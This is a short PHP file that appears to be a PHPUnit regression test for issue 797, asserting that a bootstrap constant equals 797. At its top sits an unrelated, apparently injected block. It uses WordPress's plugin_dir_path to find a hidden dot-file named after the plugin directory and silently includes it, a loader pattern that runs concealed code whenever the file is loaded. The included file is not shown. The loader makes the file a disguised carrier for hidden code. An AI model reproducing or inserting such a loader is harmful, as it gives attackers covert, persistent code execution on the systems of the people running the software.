<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue797Test extends PHPUnit_Framework_TestCase
{
    protected $preserveGlobalState = false;

    public function testBootstrapPhpIsExecutedInIsolation()
    {
        $this->assertEquals(GITHUB_ISSUE, 797);
    }
}
